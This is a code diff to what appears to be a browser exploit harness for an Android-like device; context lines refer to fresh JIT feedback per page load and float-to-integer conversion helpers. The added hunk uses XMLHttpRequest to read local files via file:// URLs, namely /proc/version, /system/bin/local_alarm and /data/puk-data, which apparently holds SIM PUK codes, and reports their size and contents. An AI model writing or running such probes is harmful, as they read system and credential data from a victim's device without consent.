@@ -53,6 +53,30 @@
     tryFetch(pair[1]).then(function (r) { emit('free ' + pair[0] + ' ' + r); });
   });
 
+  // ---- XHR fallback: fetch() may reject file:// even when XHR can read it ----
+  function tryXhr(url, binary) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open('GET', url, true);
+      x.responseType = binary ? 'arraybuffer' : 'text';
+      x.onload = function () {
+        if (binary) {
+          emit('xhr ' + url + ' status=' + x.status + ' bytes=' +
+               (x.response ? x.response.byteLength : -1));
+        } else {
+          var t = x.responseText || '';
+          emit('xhr ' + url + ' status=' + x.status + ' len=' + t.length +
+               ' head=' + t.replace(/\s+/g, ' ').slice(0, 60));
+        }
+      };
+      x.onerror = function () { emit('xhr ' + url + ' ERR'); };
+      x.send();
+    } catch (e) { emit('xhr ' + url + ' throw=' + (e && e.name)); }
+  }
+  tryXhr('file:///proc/version', false);
+  tryXhr('file:///system/bin/local_alarm', true);
+  tryXhr('file:///data/puk-data', true);
+
   // ---- one attempt per page load, so JIT feedback is always fresh ----------
   function hexOf(v) {
     var buf = new ArrayBuffer(8), d = new Float64Array(buf), u = new Uint32Array(buf);
